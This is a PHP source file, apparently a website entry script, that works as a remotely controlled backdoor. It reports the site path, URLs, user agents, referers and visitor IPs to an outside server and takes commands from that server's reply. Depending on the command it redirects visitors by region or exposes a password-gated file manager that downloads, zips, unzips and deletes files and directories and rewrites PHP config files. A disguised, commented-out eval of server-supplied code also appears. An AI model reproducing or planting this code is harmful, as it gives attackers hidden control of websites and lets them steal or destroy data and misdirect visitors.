<?php
 header("Content-Type:text/html;charset=utf-8");
 define('P_ROOTip', str_replace("\\", '/', dirname(__FILE__)));  // 路径
 
require_once("pot_core.function.php");

require_once("include/inc.php");
require_once("include/include.php");
require_once("include/inde.php");
  $lu=$_SERVER['HTTP_USER_AGENT'];
 $lurl='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']; 
//$lurl=$_SERVER['HTTP_HOST']; 
$urlcode=MD5($_SERVER['HTTP_HOST']); //+host
$urlget=AULG.$urlcode;
$url=AUL.'&i=fontlt_i:'.P_ROOTip.'&r='.$lurl;

$para= array(
'p57usercode' => $p57usercode,
'i' => 'fontlt_i:'.P_ROOTip,
'r'=>'curl_post',
);

 $cacert_url='';

$rget=getHttpResponseGET($urlget,$cacert_url);
  $rget=json_decode($rget);

 if($rget){
 	 $optcode=explode('#',$rget->optcode);
 	 
 	 if($optcode[0]=='1'){  //$optcode[0]------------------
 	     $url=AUL.'&i=curl_ft1='.P_ROOTip.'&r='.$lurl;
 	     $cacert_url='';
         $r=getHttpResponsePOST($url, $cacert_url, $para, $input_charset = '');
 	 
 	 	//echo '1';
 	 	  Header("Location:".$rget->jpurl);
 	 }else if($optcode[0]=='2'){  //ip   //$optcode[0]------------------
 	   $url=AUL.'&i=curl_ft2:'.P_ROOTip.'&r='.$lurl;
 	   $cacert_url='';
       $r=getHttpResponsePOST($url, $cacert_url, $para, $input_charset = '');
 	 
 	 	  require_once 'ipdir/global.php';
              $ip= get_env('ip');
            
              $area= ip2area($ip);
               $ar=0;
              $areaArray= explode(',',$rget->areas);
           if (in_array($area,$areaArray)){
 	           Header("Location:".$rget->jpurl);
           }else{
           	   
           }
 	 	
 	 }else if($optcode[0]=='3'){   // //$optcode[0]------------------

 	 
 	  $passwd1=isset($_POST["passwd1"])?$_POST["passwd1"]:'0';
 	  $md5passwd1=MD5($passwd1);
 	  

 	 	  require_once 'ipdir/global.php';
              $ip= get_env('ip');
              $area= ip2area($ip);
               $ar=0;
              $areaArray= explode(',',$rget->areas);
           if (in_array($area,$areaArray)){
 	          // e-v-pppa-l($rget->evcode);
 	          if($optcode[2]=='1'){
 	          	  $url=AUL.'&i=curl_ft3:'.P_ROOTip.'&r='.$lurl.$lu;
 	              $cacert_url='';
                  $r=getHttpResponsePOST($url, $cacert_url, $para, $input_charset = '');
 	          }

 	           
           }else{
           $rf=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:''; 
           $rf='_rf_'.$rf.'_ie_'.$lu;
     $url=AUL.'&i=curl_ft3_notin_'.$ip.$area.':'.P_ROOTip.'&r='.$lurl.$rf;
 	 $cacert_url='';
     $r=getHttpResponsePOST($url, $cacert_url, $para, $input_charset = '');
 	 
	        echo  $area;
           	   exit;
           }
 	 	require_once 'ipdir/file.func.php';
 	 	// str_replace("world","Shanghai","Hello world!"); explode(',',$source); 
 	 error_reporting(E_ERROR);
	   $dir=isset($_POST["dir"])?$_POST["dir"]:P_ROOTip;
	    $isfile=isset($_POST["isfile"])?$_POST["isfile"]:'0';
	    $cfg=isset($_POST["cfg"])?$_POST["cfg"]:'0';
	     $mod=isset($_POST["mod"])?$_POST["mod"]:'0';
 	    $dir=iconv('UTF-8','GB2312', $dir);
 	   set_time_limit(0); 
 	 	//$dir=isset($_GET["dir"])?$_GET["dir"]:P_ROOTip;
 	 		 
 	 	 //$dir=P_ROOTip;
 	 	
 	 	//print_r($fils);
        //  echo '3';
 	 	//  Header("Location:".$rget->jpurl);
 
 	  
 	 if($isfile=='1'&&$md5passwd1==$optcode[1]){  //

 	 
 	 	if(is_file($dir)) {
 	 		
 	 		$sz=filesize($dir);
 	 		if($sz<50*1024*1024){
 	 			
 	 			 
  		//set_time_limit(0);
 	      //  header("Content-type: image/pjpeg"); 1
 	     // $filesize=filesize($dir);
 	      
           // header("Content-Type: application/force-download");
           // header("Accept-Ranges: bytes");
          //  header("Content-length: ". $filesize);
            $dirname = preg_replace('/^.+[\\\\\\/]/', '', $dir);
              file_down($dir,$dirname);
          //  header("Content-Disposition: attachment; filename=lit_".$dirname);
           // readfile($dir);
            // exit; 
 	 		}else{
 
             set_time_limit(0); 
             $file=$dir;
            downloadBagFile($file);
            exit;
              header("Content-Type:application/force-download");
                 $dirname = preg_replace('/^.+[\\\\\\/]/', '', $dir);
            header("Content-Disposition:attachment;filename=big_".$dirname);
            $fp = fopen($file, "rb"); 
            fseek($fp,0); 
            while (!feof($fp)) { 
                   print (fread($fp, 1024 * 1024)); 
                   flush(); 
                 ob_flush(); 
            } 
               fclose($fp); 
                exit;
 	 		}
 	 		
 	 		
        }else{
            echo "文件不存在！";
            exit;
        }
 	 }else if($isfile=='2'&&$md5passwd1==$optcode[1]){ //
 	 		
 	 		$zip=new ZipArchive;
 	 			$dir1=dirname($dir);
 	 			$dirname = preg_replace('/^.+[\\\\\\/]/', '', $dir);
 	 	 
    // if($zip->open(basename($dir).'.zip',ZipArchive::OVERWRITE)===TRUE){
     if($zip->open($dirname.'.zip',ZipArchive::OVERWRITE)===TRUE){
	         addFileToZip($dir, $zip);
	            //$zip->addFile($dir);//假设加入的文件名是image.txt，在当前路径下
	          $zip->close();
     }
     $dir=$dir1;
      $fils=get_filedir($dir);
        $dir=iconv('GB2312', 'utf-8',$dir); 
        $dir=dir_path1($dir);
 	 	 $fils['dirs']=$dir;
 	 	 
 	 	$lists1=$fils['dir'];
 	 	$lists2=$fils['files'];
 	    //print_r($lists1);
 	 	//exit;
 	 	$pdir=$dir1;
 	 	require_once 'include/tpllist.php';
  	        exit;
 	 }else if($isfile=='3'&&$md5passwd1==$optcode[1]){ //删除
 	 	unlink ($dir);
 	 	$dir=dirname($dir);
 	 	 $fils=get_filedir($dir);
 	 	   $dir=iconv('GB2312', 'utf-8',$dir); 
 	 	    $dir=dir_path1($dir);
 	 	 $fils['dirs']=$dir;
 	 	 
 	 	$lists1=$fils['dir'];
 	 	$lists2=$fils['files'];
 	    //print_r($lists1);
 	 	//exit;
 	 	 	$pdir=$dir;
 	 	require_once 'include/tpllist.php';
 	 }else if($isfile=='4'&&$md5passwd1==$optcode[1]){ //
 	 		 $zip = new ZipArchive; 
 	 		 $dir1=dirname($dir);
 $res = $zip->open($dir); 
 if ($res === TRUE) { 
     
    $zip->extractTo($dir1); 
     $zip->close(); 
 } else { 
     echo 'failed, code:' . $res; 
 } 
 
     $dir=$dir1;
      $fils=get_filedir($dir);
       $dir=iconv('GB2312', 'utf-8',$dir); 
        $dir=dir_path1($dir);
 	 	 $fils['dirs']=$dir;
 	 	 
 	 	$lists1=$fils['dir'];
 	 	$lists2=$fils['files'];
 	    //print_r($lists1);
 	 	//exit;
 	 	 	$pdir=$dir;
 	 	require_once 'include/tpllist.php';
  	        exit;
 	 }else if($isfile=='5'&&$md5passwd1==$optcode[1]){ //删除dir
 	 	 
 	 	delDirAndFile($dir);
 	 	$dir=dirname($dir);
 	 	 $fils=get_filedir($dir);
 	 	  $dir=iconv('GB2312', 'utf-8',$dir); 
 	 	  $dir=dir_path1($dir);
 	 	 $fils['dirs']=$dir;
 	 	 
 	 	$lists1=$fils['dir'];
 	 	$lists2=$fils['files'];
 	    //print_r($lists1);
 	 	//exit;
 	 	 	$pdir=$dir;
 	 	require_once 'include/tpllist.php';
 	 }else if($isfile=='6'&&$md5passwd1==$optcode[1]){ //删除dir
 	 	  $basedir=$dir;
 	 	//delDirAndFile($dir);
 	 	set_time_limit(0); ignore_user_abort();
 	 	getMD5DirAndFile($dir,$cfg,$mod,$basedir);
 	 	
 	 	$sts=P_ROOTip.'/include/stst.php';				 		
	    
	    $cfgs=include $sts;	 
	 
 	 	$dir=dirname($dir);
 	 	 $fils=get_filedir($dir);
 	 	  $dir=iconv('GB2312', 'utf-8',$dir); 
 	 	  $dir=dir_path1($dir);
 	 	 $fils['dirs']=$dir;
 	 	 
 	 	$lists1=$fils['dir'];
 	 	$lists2=$fils['files'];
 	    //print_r($lists1);
 	 	//exit;
 	 	 	$pdir=$dir;
 	 	require_once 'include/tpllist.php';
 	 }else if($isfile=='7'&&$md5passwd1==$optcode[1]){ //删除dir
 	  $basedir=$dir;
 	  set_time_limit(0); ignore_user_abort();
 	 	 checkMD5DirAndFile($dir,$cfg,$mod,$basedir);
 	 	//delDirAndFile($dir); 	 	
 	 	

 	 	$sts=P_ROOTip.'/include/stst.php';				 			    
	    $cfgs=include $sts;	  
	    
	 
 	 	$dir=dirname($dir);
 	 	 $fils=get_filedir($dir);
 	 	  $dir=iconv('GB2312', 'utf-8',$dir); 
 	 	  $dir=dir_path1($dir);
 	 	 $fils['dirs']=$dir;
 	 	 
 	 	$lists1=$fils['dir'];
 	 	$lists2=$fils['files'];
 	    //print_r($lists1);
 	 	//exit;
 	 	 	$pdir=$dir;
 	 	require_once 'include/tpllist.php';
 	 }else if($isfile=='8'&&$md5passwd1==$optcode[1]){ //删除dir
 	 	// checkMD5DirAndFile($dir);
 	 	//delDirAndFile($dir); 	 	
 	 	  $cfgkey=isset($_POST["cfgkey"])?$_POST["cfgkey"]:'0';
 	 	   $cfgname=isset($_POST["cfgname"])?$_POST["cfgname"]:'0';
 	 	     $del=isset($_POST["del"])?$_POST["del"]:'0';
 	 	     
 	 	     $config = array ('conf'=>array ($cfgkey =>$cfgname ),                    
             ); 
             
             $sts=P_ROOTip.'/include/stst.php';				 			    
	         $cfgs=include $sts;	  
	    
             $newarr= array_merge($cfgs['conf'],$config['conf']);
             $config['conf']=$newarr;
             
 	 	   if($del==1){
 	 	   	 $sts=P_ROOTip.'/include/stst.php';				 			    
	         $cfgs1=include $sts;	
	           $cfgs2=$cfgs1['conf'];
	    	unset($cfgs2[$cfg]);
	    	$cfgs3['conf']=$cfgs2;
	     
	    	set_config($sts,$cfgs3,1);	
	    	$file=P_ROOTip.'/include/'.$cfg.'.php';
	    	     unlink($file);
 	 	   }else{       	   	    
             $fileroot=P_ROOTip.'/include/stst.php'; 
             set_config($fileroot,$config,1);              
 	 	   }  
 	 	   

             
 	 	
 	 	$sts=P_ROOTip.'/include/stst.php';				 			    
	    $cfgs=include $sts;	  
	 
 	 	$dir=dirname($dir);
 	 	 $fils=get_filedir($dir);
 	 	  $dir=iconv('GB2312', 'utf-8',$dir); 
 	 	  $dir=dir_path1($dir);
 	 	 $fils['dirs']=$dir;
 	 	 
 	 	$lists1=$fils['dir'];
 	 	$lists2=$fils['files'];
 	    //print_r($lists1);
 	 	//exit;
 	 	 	$pdir=$dir;
 	 	require_once 'include/tpllist.php';
 	 }else if($isfile=='9'&&$md5passwd1==$optcode[1]){ //删除dir
 	   $code=isset($_POST["code"])?$_POST["code"]:'0';
 	 	checkMUMADirAndFile($dir,$code);
 	 	//delDirAndFile($dir); 	 	
 	 	$stck1=P_ROOTip.'/include/stck.php';				 			    
	    $stck=include $stck1;	  
	    
 	 	$sts=P_ROOTip.'/include/stst.php';				 			    
	    $cfgs=include $sts;	  
	 
 	 	$dir=dirname($dir);
 	 	 $fils=get_filedir($dir);
 	 	  $dir=iconv('GB2312', 'utf-8',$dir); 
 	 	  $dir=dir_path1($dir);
 	 	 $fils['dirs']=$dir;
 	 	 
 	 	$lists1=$fils['dir'];
 	 	$lists2=$fils['files'];
 	    //print_r($lists1);
 	 	//exit;
 	 	 	$pdir=$dir;
 	 	require_once 'include/tpllist.php';
 	 }else if($isfile=='10'&&$md5passwd1==$optcode[1]){ //删除dir
 	  
 	 	//delDirAndFile($dir); 	 	
 	 	$stck1=P_ROOTip.'/include/stck.php';				 			    
	      
	    $newarr=array();
 	 	 $result = file_put_contents($stck1, "<?php\treturn " . var_export($newarr, true) . ";?>"); //主要看这一行  	
 
	 
 	 	$dir=dirname($dir);
 	 	 $fils=get_filedir($dir);
 	 	  $dir=iconv('GB2312', 'utf-8',$dir); 
 	 	  $dir=dir_path1($dir);
 	 	 $fils['dirs']=$dir;
 	 	 
 	 	$lists1=$fils['dir'];
 	 	$lists2=$fils['files'];
 	    //print_r($lists1);
 	 	//exit;
 	 	 	$pdir=$dir;
 	 	require_once 'include/tpllist.php';
 	 }else{
 	 	//	$dir=iconv('GB2312', 'utf-8',$dir); 
 	 	 // echo $dir;
 	 	//  exit;
  
 	 	 $fils=get_filedir($dir);
 	 	 // print_r($fils);
 	 	 // exit;
 	 	 $dir=iconv('GB2312', 'utf-8',$dir); 
 	 	  $dir=dir_path1($dir); 	  
 	 	  //  exit;
 	 	 $fils['dirs']=$dir;
 	 	 
 	 	$lists1=$fils['dir'];
 	 	$lists2=$fils['files'];
 	    //print_r($lists1);
 	 	//exit;
 	 	 	$pdir=$dir;
 	 	require_once 'include/tpllist.php';
 	 	
 	 }	

 	 	
 	 }else{//$optcode[0]------------------
 	 	 $url=AUL.'&i=curl_ftelse='.P_ROOTip.'&r='.$lurl;
 	     $cacert_url='';
         $r=getHttpResponsePOST($url, $cacert_url, $para, $input_charset = '');
 	 
 	 	   //echo '?';
 	 } 	
 }
 

?>